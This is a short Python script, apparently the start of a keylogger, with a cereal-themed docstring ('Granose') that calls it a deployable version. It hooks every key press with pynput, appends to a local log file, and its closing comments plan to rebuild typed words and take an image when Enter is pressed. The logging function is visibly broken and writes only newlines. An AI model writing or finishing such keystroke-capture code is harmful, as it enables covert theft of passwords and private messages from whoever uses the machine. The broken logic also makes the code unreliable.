'''
Granose is the first flake cereal which was created by Kellogg.
Of course, like Kellogg's cereal, there were versions before but this will be the first working/deployable version!
'''

from pynput.keyboard import Key, Listener
import os, sys 
import shutil #to copy txt files
import datetime

count = 0
keys = []

def on_press(key):
	global keys, count
	keys.append(key)
	count +=1
	print("{0} pressed".format(key))
	if count >=1:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open("32log.txt", "a+") as f:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				f.write('\n')
			elif k.find("Key") >0:
				f.write('\n')

def on_release(key):
	if key == Key.esc:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()



#What I am going for:

#Input: Tapestry

'''
Output:
T
Ta
Tap
Tape
Tapes
Tapest
Tapestr
Tapestry
'''

# If enter is pressed an image is taken
